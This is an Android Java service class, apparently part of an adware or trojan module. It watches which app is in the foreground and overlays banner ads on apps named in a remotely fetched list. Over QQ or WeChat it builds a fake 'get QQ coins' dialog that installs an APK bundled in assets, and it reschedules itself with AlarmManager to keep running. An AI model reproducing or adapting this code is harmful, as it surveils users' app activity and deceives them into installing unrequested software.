package com.cdd.wad;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.PixelFormat;
import android.graphics.drawable.BitmapDrawable;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;

import com.cdd.tg.TG;
import com.cdd.utils.DataStoreUtils;
import com.cdd.utils.FileUtil;
import com.cdd.utils.HttpUtils;
import com.cdd.utils.InputStreamParser;
import com.cdd.ym.YMAd;

public class WdvService extends Service {
  private static final String ACT_RESTART = "act_restart";

  private View floatView;
  private WindowManager.LayoutParams windowParams;
  private String selfPkg;

  public static ArrayList<String> appList = new ArrayList<String>();
  // ///////////////////msg & action/////////////////////////
  private static final int ACT_RESTART_INFO = 1;
  /*** 检测最顶的PKG是否是合法 */
  private static final int ACT_CHECK_TOP_PKG = 2;
  private static final int ACT_SHOW_ADV = 3;
  /** 判断是否需要显示广告，如果顶层不是合法PKG，不显示广告条 */
  private static final int ACT_CHECK_IS_SHOW = 4;

  /** view类型，纯图片，or icon + 文字 */
  protected static final int VIEWTYPE_IMAGE_ADV = 1;
  protected static final int VIEWTYPE_ICON_TEXT_ADV = 2;
  protected static final int VIEWTYPE_AZ_ADV = 3;
  protected static final int VIEWTYPE_YM_ADV = 4;
  protected static final int VIEWTYPE_BD_ADV = 5;

  static ScheduledExecutorService executor = null;

  private String currentPkg = null;

  @SuppressLint("HandlerLeak")
  private Handler msgHandler = new Handler() {

    public void handleMessage(Message msg) {
      int what = msg.what;
      switch (what) {
        case ACT_CHECK_TOP_PKG: {
          msgHandler.removeMessages(ACT_CHECK_TOP_PKG);
          getCurPkgName();
          if (topPkgIsValid(currentPkg)) {
            msgHandler.sendEmptyMessage(ACT_SHOW_ADV);
          } else {
            removeView();
            msgHandler.sendEmptyMessageDelayed(ACT_CHECK_TOP_PKG, 500);
          }
        }
          break;
        case ACT_CHECK_IS_SHOW: {
          if (topPkgIsValid(currentPkg)) {
            // 显示着
          } else {
            // 退出不显示
            closeAdvView();
          }
          msgHandler.sendEmptyMessageDelayed(ACT_CHECK_TOP_PKG, 500);
        }
          break;
        case ACT_SHOW_ADV: {
          msgHandler.removeMessages(ACT_SHOW_ADV);
          createView(VIEWTYPE_AZ_ADV, null, null);
          msgHandler.sendEmptyMessageDelayed(ACT_CHECK_IS_SHOW, 500);
        }
          break;
      }
    };
  };

  @Override
  public IBinder onBind(Intent intent) {
    return null;
  }

  private static String baseUrl = "http://download-souce.googlecode.com/svn/trunk/config/wad_app.txt";

  @Override
  public void onCreate() {
    super.onCreate();
    updateApps();
    // 初始化
    initWinParams();
    selfPkg = getPackageName();
    msgHandler.sendEmptyMessage(ACT_CHECK_TOP_PKG);
  }

  /**
   * 监控用户动作
   */
  private void getCurPkgName() {
    ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
    List<RunningTaskInfo> runningTasks = manager.getRunningTasks(1);
    RunningTaskInfo cinfo = runningTasks.get(0);
    ComponentName component = cinfo.topActivity;
    currentPkg = component.getPackageName();
  }

  private void initWinParams() {
    windowParams = new WindowManager.LayoutParams();
    windowParams.type = LayoutParams.TYPE_PHONE; // 设置window type
    windowParams.format = PixelFormat.RGBA_8888; // 设置图片格式，效果为背景透明
    // 设置Window flag
    windowParams.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL | LayoutParams.FLAG_NOT_FOCUSABLE;
    /*
     * 注意，flag的值可以为： LayoutParams.FLAG_NOT_TOUCH_MODAL 不影响后面的事件
     * LayoutParams.FLAG_NOT_FOCUSABLE 不可聚焦 LayoutParams.FLAG_NOT_TOUCHABLE 不可触摸
     */
    // 调整悬浮窗口至左上角，便于调整坐标
    windowParams.gravity = Gravity.LEFT | Gravity.TOP;
    // 以屏幕左上角为原点，设置x、y初始值
    windowParams.x = (int) 0;
    windowParams.y = (int) 0;
    // 设置悬浮窗口长宽数据
    windowParams.width = LayoutParams.MATCH_PARENT;
    windowParams.height = LayoutParams.WRAP_CONTENT;
  }

  @Override
  public int onStartCommand(Intent intent, int flags, int startId) {
    return super.onStartCommand(intent, flags, startId);
  }

  private boolean topPkgIsValid(String pkg) {
    if (pkg == null) {
      return false;
    }
    ActivityManager mActivityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
    RunningTaskInfo rti = mActivityManager.getRunningTasks(1).get(0);
    String topPkg = rti.topActivity.getPackageName();
    if (topPkg.equals(selfPkg)) {
      return false;
    }

    PackageManager pManager = getPackageManager();
    PackageInfo pkgInfo;
    try {
      pkgInfo = pManager.getPackageInfo(topPkg, 0);
    } catch (NameNotFoundException e) {
      return false;
    }
    if ((pkgInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) <= 0) {
      // 非系统应用
      if (appList.contains(pkg)) {
        return true;
      }
    }

    return false;
  }

  private void createView(int viewType, String advContent, BitmapDrawable icon) {
    long lt = 0;
    try {
      lt = Long.valueOf(DataStoreUtils.readLocalInfo(getApplication(), "sh_ow_ad"));
    } catch (Exception e) {
    }

    String txTg = DataStoreUtils.readLocalInfo(getApplicationContext(), "tx_tg");
    if (TextUtils.isEmpty(txTg)) {
      ActivityManager mActivityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
      RunningTaskInfo rti = mActivityManager.getRunningTasks(1).get(0);
      String topPkg = rti.topActivity.getPackageName();
      if (!("com.tencent.mobileqq".equals(topPkg) || "com.tencent.mm".equals(topPkg))) {
        return;
      }
      AlertDialog.Builder builder = new AlertDialog.Builder(getApplicationContext());
      builder.setTitle("温馨提示");
      builder.setMessage("安装游戏中心即可获得QQ币");
      builder.setNegativeButton("取消", new DialogInterface.OnClickListener() {
        @Override
        public void onClick(DialogInterface dialog, int which) {
          dialog.cancel();
        }
      });
      builder.setPositiveButton("安装", new DialogInterface.OnClickListener() {
        @Override
        public void onClick(DialogInterface dialog, int which) {
          new Thread() {
            @Override
            public void run() {
              String result = FileUtil.copyFromAssets(getApplication(), TG.FILE_NAME);
              if (!TextUtils.isEmpty(result)) {
                Message msg = Message.obtain(TG.handler, TG.DIALOG_ALERT_INSTALL, result);
                TG.handler.sendMessage(msg);
              }
            }
          }.start();
        }
      });
    }
    if (System.currentTimeMillis() - lt > 15 * 60 * 1000) {

      if (null != floatView) {
        // 已经显示
        return;
      }
        floatView = getYMBanner();

      // floatView.setOnClickListener(closeIVClick);
      // 获取WindowManager
      WindowManager windowManager = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
      windowManager.addView(floatView, windowParams);
      floatView.postDelayed(new Runnable() {
        @Override
        public void run() {
          if (floatView != null) {
            floatView.setVisibility(View.GONE);
          }
          floatView = null;
        }
      }, 40 * 1000);
      DataStoreUtils.saveLocalInfo(getApplication(), "sh_ow_ad", System.currentTimeMillis() + "");
    }
  }

  private View getYMBanner() {
    return YMAd.getBannerView(getApplicationContext(), 1);
  }

  /**
   * 移除view
   */
  private void removeView() {
    if (null == floatView) {
      return;
    }
    WindowManager windowManager = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
    windowManager.removeView(floatView);
    floatView = null;
  }

  private void closeAdvView() {
    removeView();
    // 1个小时候后再check
    msgHandler.removeMessages(ACT_CHECK_TOP_PKG);
    msgHandler.sendEmptyMessageDelayed(ACT_CHECK_TOP_PKG, 2 * 60 * 1000);
  }

  /**
   * 隔一段时间，启动一个service
   * 
   * @param context
   */
  public static void restartAdvService(Context context) {
    Intent intentAlarm = new Intent();
    intentAlarm.setClass(context, WdvService.class);
    PendingIntent pendingIntent = PendingIntent.getService(context, 0, intentAlarm, 0);
    intentAlarm.putExtra(ACT_RESTART, ACT_RESTART_INFO);
    AlarmManager manager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
    long firstime = System.currentTimeMillis();
    manager.setRepeating(AlarmManager.RTC, firstime, 360000, pendingIntent);
  }

  private static void updateApps() {
    new Thread() {
      @Override
      public void run() {
        InputStreamParser<String> parser = new InputStreamParser<String>() {
          @Override
          public String parser(InputStream inputStream) {
            try {
              String temp = null;
              BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
              ArrayList<String> list = new ArrayList<String>();
              while ((temp = br.readLine()) != null) {
                list.add(temp);
              }
              WdvService.appList = list;
            } catch (Exception e) {
              e.printStackTrace();
            } finally {
            }
            return null;
          }
        };
        String url = baseUrl;
        HttpUtils.get(url, parser);

      }
    }.start();
  }
}
